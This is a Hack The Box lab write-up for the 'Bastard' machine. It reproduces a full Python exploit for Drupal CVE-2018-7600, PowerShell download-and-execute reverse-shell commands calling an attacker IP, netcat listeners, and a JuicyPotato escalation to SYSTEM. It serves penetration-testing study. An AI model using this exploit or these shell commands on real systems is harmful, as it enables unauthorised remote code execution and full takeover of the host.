---
title: "Hack The Box - Bastard"
date: 2020-02-28
tags: [oscp, htb, windows]
collection: oscp-prep
published: true
layout: single
classes: wide
toc: true
toc_label: Table of Contents
headline: "Drupal RCE, and JuicyPotato"
picture: /assets/htb-bastard/machine_info.png
author_profile: false
---

![](/assets/htb-bastard/machine_info.png)

## Enumeration

Nmap results show port 80 open, running IIS 7.5, which means we're looking at a Windows 7/Server 2008 R2 target. We can also see the 2 Windows RPC ports open as well.

```
Nmap scan report for 10.10.10.9
Host is up, received user-set (0.053s latency).
Not shown: 65532 filtered ports
Reason: 65532 no-responses
PORT      STATE SERVICE REASON  VERSION
80/tcp    open  http    syn-ack Microsoft IIS httpd 7.5
|_http-generator: Drupal 7 (http://drupal.org)
| http-methods: 
|_  Potentially risky methods: TRACE
| http-robots.txt: 36 disallowed entries (15 shown)
| /includes/ /misc/ /modules/ /profiles/ /scripts/ 
| /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt 
| /INSTALL.pgsql.txt /INSTALL.sqlite.txt /install.php /INSTALL.txt 
|_/LICENSE.txt /MAINTAINERS.txt
|_http-server-header: Microsoft-IIS/7.5
|_http-title: Welcome to 10.10.10.9 | 10.10.10.9
135/tcp   open  msrpc   syn-ack Microsoft Windows RPC
49154/tcp open  msrpc   syn-ack Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

Looking at `robots.txt`, we can see a pretty long list of allowed/disallowed entries. The most interesting of these are listed below.

```
# Directories
Disallow: /includes/
Disallow: /misc/
Disallow: /modules/
Disallow: /profiles/
Disallow: /scripts/
Disallow: /themes/
# Files
Disallow: /CHANGELOG.txt
Disallow: /cron.php
Disallow: /INSTALL.mysql.txt
Disallow: /INSTALL.pgsql.txt
Disallow: /INSTALL.sqlite.txt
Disallow: /install.php
Disallow: /INSTALL.txt
Disallow: /LICENSE.txt
Disallow: /MAINTAINERS.txt
Disallow: /update.php
Disallow: /UPGRADE.txt
Disallow: /xmlrpc.php
# Paths (clean URLs)
Disallow: /admin/
Disallow: /comment/reply/
Disallow: /filter/tips/
Disallow: /node/add/
Disallow: /search/
Disallow: /user/register/
Disallow: /user/password/
Disallow: /user/login/
Disallow: /user/logout/
# Paths (no clean URLs)
Disallow: /?q=admin/
Disallow: /?q=comment/reply/
Disallow: /?q=filter/tips/
Disallow: /?q=node/add/
Disallow: /?q=search/
Disallow: /?q=user/password/
Disallow: /?q=user/register/
Disallow: /?q=user/login/
Disallow: /?q=user/logout/
```

We find in `CHANGELOG.txt` that we're looking at a Drupal 7.54 system.

---

## Initial Shell

### CVE2018-7600

When we run a search for *drupal* on Exploit-DB, we do get several exploits for Remote Code Execution on Drupal, that apply to 7.54. However, I wasn't able to get any of them to work properly. What I did find out though, is that this vulnerability is CVE-2018-7600. If we run a Google search for `github CVE-2018-7600`, we get [this result](https://github.com/pimps/CVE-2018-7600), which contains code for CVE2018-7600 and CVE2018-7602. While CVE2018-7602 is similar, it requires authentication first, which we don't have at this point. We can download the code for the CVE2018-7600 exploit locally, as below.

```python
#!/usr/bin/env python3

import requests
import argparse
from bs4 import BeautifulSoup

def get_args():
  parser = argparse.ArgumentParser( prog="drupa7-CVE-2018-7600.py",
                    formatter_class=lambda prog: argparse.HelpFormatter(prog,max_help_position=50),
                    epilog= '''
                    This script will exploit the (CVE-2018-7600) vulnerability in Drupal 7 <= 7.57
                    by poisoning the recover password form (user/password) and triggering it with
                    the upload file via ajax (/file/ajax).
                    ''')
  parser.add_argument("target", help="URL of target Drupal site (ex: http://target.com/)")
  parser.add_argument("-c", "--command", default="id", help="Command to execute (default = id)")
  parser.add_argument("-f", "--function", default="passthru", help="Function to use as attack vector (default = passthru)")
  parser.add_argument("-p", "--proxy", default="", help="Configure a proxy in the format http://127.0.0.1:8080/ (default = none)")
  args = parser.parse_args()
  return args

def pwn_target(target, function, command, proxy):
  requests.packages.urllib3.disable_warnings()
  proxies = {'http': proxy, 'https': proxy}
  print('[*] Poisoning a form and including it in cache.')
  get_params = {'q':'user/password', 'name[#post_render][]':function, 'name[#type]':'markup', 'name[#markup]': command}
  post_params = {'form_id':'user_pass', '_triggering_element_name':'name', '_triggering_element_value':'', 'opz':'E-mail new Password'}
  r = requests.post(target, params=get_params, data=post_params, verify=False, proxies=proxies)
  soup = BeautifulSoup(r.text, "html.parser")
  try:
    form = soup.find('form', {'id': 'user-pass'})
    form_build_id = form.find('input', {'name': 'form_build_id'}).get('value')
    if form_build_id:
        print('[*] Poisoned form ID: ' + form_build_id)
        print('[*] Triggering exploit to execute: ' + command)
        get_params = {'q':'file/ajax/name/#value/' + form_build_id}
        post_params = {'form_build_id':form_build_id}
        r = requests.post(target, params=get_params, data=post_params, verify=False, proxies=proxies)
        parsed_result = r.text.split('[{"command":"settings"')[0]
        print(parsed_result)
  except:
    print("ERROR: Something went wrong.")
    raise

def main():
  print ()
  print ('=============================================================================')
  print ('|          DRUPAL 7 <= 7.57 REMOTE CODE EXECUTION (CVE-2018-7600)           |')
  print ('|                              by pimps                                     |')
  print ('=============================================================================\n')

  args = get_args() # get the cl args
  pwn_target(args.target.strip(), args.function.strip(), args.command.strip(), args.proxy.strip())


if __name__ == '__main__':
  main()
```

Reviewing the code, we see that we need to run the below command to target the system. While the exploit will try to run `id` on the system by default, that's not normally a Windows friendly command. As you can see, I use the `-c` option to have the system ping my machine instead. I can catch the ICMP pings with `sudo tcpdump -i tun0 icmp`. As you can see in the screenshots, we can see the pings locally, which means we have a good RCE with this exploit.

```
python3 7600.py -c 'ping 10.10.14.24' http://10.10.10.9/
```

![](/assets/htb-bastard/rce_ping.png)

![](/assets/htb-bastard/tcpdump_pingresults.png)

We can again use the same exploit to capture the `systeminfo` output below, which tells us that we're looking at a 64-bit Server 2008 system.

```
Host Name:                 BASTARD
OS Name:                   Microsoft Windows Server 2008 R2 Datacenter 
OS Version:                6.1.7600 N/A Build 7600
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Standalone Server
OS Build Type:             Multiprocessor Free
Registered Owner:          Windows User
Registered Organization:   
Product ID:                00496-001-0001283-84782
Original Install Date:     18/3/2017, 7:04:46 ��
System Boot Time:          29/2/2020, 12:02:09 ��
System Manufacturer:       VMware, Inc.
System Model:              VMware Virtual Platform
System Type:               x64-based PC
Processor(s):              2 Processor(s) Installed.
                           [01]: AMD64 Family 23 Model 1 Stepping 2 AuthenticAMD ~2000 Mhz
                           [02]: AMD64 Family 23 Model 1 Stepping 2 AuthenticAMD ~2000 Mhz
BIOS Version:              Phoenix Technologies LTD 6.00, 12/12/2018
Windows Directory:         C:\Windows
System Directory:          C:\Windows\system32
Boot Device:               \Device\HarddiskVolume1
System Locale:             el;Greek
Input Locale:              en-us;English (United States)
Time Zone:                 (UTC+02:00) Athens, Bucharest, Istanbul
Total Physical Memory:     2.047 MB
Available Physical Memory: 1.544 MB
Virtual Memory: Max Size:  4.095 MB
Virtual Memory: Available: 3.565 MB
Virtual Memory: In Use:    530 MB
Page File Location(s):     C:\pagefile.sys
Domain:                    HTB
Logon Server:              N/A
Hotfix(s):                 N/A
Network Card(s):           1 NIC(s) Installed.
                           [01]: Intel(R) PRO/1000 MT Network Connection
                                 Connection Name: Local Area Connection
                                 DHCP Enabled:    No
                                 IP address(es)
                                 [01]: 10.10.10.9
```

Knowing this, we should try to get a reverse shell using the 64-bit version of PowerShell. This means we need to specify the exact path, as the `powershell.exe` in a normal Windows path is 32-bit. By default, this binary can be found at `C:\windows\system32\WindowsPowerShell\v1.0\powershell.exe`. We can test for this path with another ping test, with the below command.

```
python3 7600.py -c 'C:\windows\system32\WindowsPowerShell\v1.0\powershell.exe ping 10.10.14.24' http://10.10.10.9/
```

![](/assets/htb-bastard/rce_ps_ping.png)

![](/assets/htb-bastard/tcpdump_ps_ping.png)

As you can see above, we didn't see the results as before in the exploit, but we did get the pings in `tcpdump`, so the binary path is correct, and we can use the 64-bit binary for the RCE.

### Nishang

For a reverse shell, we can use the `Invoke-PowerShellTcp.ps1` script from [Nishang](https://github.com/samratashok/nishang). I've copied the repo locally already to `/opt`. We can copy the file to our working directory with `cp /opt/nishang/Shells/Invoke-PowerShellTcp.ps1 revshell.ps1`. This will also rename the file to `revshell.ps1`, making it easier to type.

We now need to modify the script to automatically call the function we need, instead of just loading the functions into memory. Add the below line to the bottom of the `revshell.ps1` script.

```powershell
Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.24 -Port 7500
```

We have the script, but now we need to open a way to get it to the target. I like the [updog tool](https://github.com/sc0tfree/updog), but you can easily just use `python -m SimpleHTTPServer` to stand up a quick webserver.

Once the web server is up, start a listener with `rlwrap nc -lvnp 7500` to catch the shell. The `rlwrap` command will catch the lines passed to the shell, and allow for a bit of a cleaner shell, especially on Windows.

To run the exploit, we can use the below command. NOte the change to double quotes for the `-c` option, as the command itself uses single quotes.

As you can see in the screenshot below, we get back our shell as `iusr`.

```
python3 7600.py -c "C:\windows\system32\WindowsPowerShell\v1.0\powershell.exe -c IEX(new-object net.webclient).downloadstring('http://10.10.14.24/revshell.ps1')" http://10.10.10.9/
```

![](/assets/htb-bastard/initial_shell.png)

We can read `user.txt` from `C:\users\dimitris\desktop\user.txt`

![](/assets/htb-bastard/user_proof.png)


---

## Privilege Escalation

### JuicyPotato

On a Windows target like this, we can see what special privileges the current account might have with `whoami /all`. This gives all the data on user group membership, as well as any privileges for the account.

In this case, we can see that the account has the `SeImpersonatePrivilege` permission enabled, which on a Server 2008 system, should allow us to use [JuicyPotato](https://ohpe.it/juicy-potato/) for privilege escalation.

![](/assets/htb-bastard/whoami_all.png)

I already have the JuicyPotato binary copied to `/opt`, so we can copy it to our working directory with `cp /opt/JuicyPotato.exe jp.exe`, which renames it to `jp.exe` for easier typing.

To copy the file, we can setup a quick SMB server on our machine, which will share out our current folder, allowing the target system to copy the file from it. This can be done with the below command.

```
sudo impacket-smbserver kali .
```

On the target, run `mkdir C:\temp` to create a temp directory that we control, and navigate to it with `cd C:\temp`. We can copy the file directly with `copy \\10.10.14.24\kali\jp.exe .`.

When we run `./jp.exe`, we get the JuicyPotato usage text below.

```
JuicyPotato v0.1 

Mandatory args: 
-t createprocess call: <t> CreateProcessWithTokenW, <u> CreateProcessAsUser, <*> try both
-p <program>: program to launch
-l <port>: COM server listen port


Optional args: 
-m <ip>: COM server listen address (default 127.0.0.1)
-a <argument>: command line argument to pass to program (default NULL)
-k <ip>: RPC server ip address (default 127.0.0.1)
-n <port>: RPC server listen port (default 135)
-c <{clsid}>: CLSID (default BITS:{4991d34b-80a1-4291-83b6-3328366b9097})
-z only test CLSID and print token's user
```

Looking at this text, we can see that we require 3 things, `-t` to tell the exploit how to create the process, `-p` to tell it what program to launch, and `-l` to give it a local COM port to listen on. In our case, we'll also need to specify the `-a` option, which provides additional arguments for the program we call with `-p`. Although it's not needed sometimes, we should specify a CLSID for the `-c` option, which tells the exploit what COM object to link to. In our case, we'll be using `{9B1F122C-2982-4e91-AA8B-E071D54F2A4D}`, which denotes *wuauserv*, the Windows Update service. A full list of CLSID's is available on the JuicyPotato site [here](https://ohpe.it/juicy-potato/CLSID/).

Before we can run the exploit on target, we need to make a copy of the previously used `revshell.ps1`, and rename it to `revshell2.ps1`. We also need to modify the script to point to port 7600 instead of 7500. Don't forget to open another listener for this shell with `rlwrap nc -lvnp 7600`.

Our final command is below. As you can see, running it on the target will kick off PowerShell as `NT AUTHORITY\SYSTEM`, and runs the command to grab and run `revshell2.ps1`.

```powershell
./jp.exe -l 9000 -p C:\windows\system32\WindowsPowerShell\v1.0\powershell.exe -t * -c '{9B1F122C-2982-4e91-AA8B-E071D54F2A4D}' -a "-c IEX(new-object net.webclient).downloadstring('http://10.10.14.24/revshell2.ps1')"
```

![](/assets/htb-bastard/root_shell.png)

We can read `root.txt` from `C:\Users\Administrator\Desktop\root.txt.txt`.

![](/assets/htb-bastard/root_proof.png)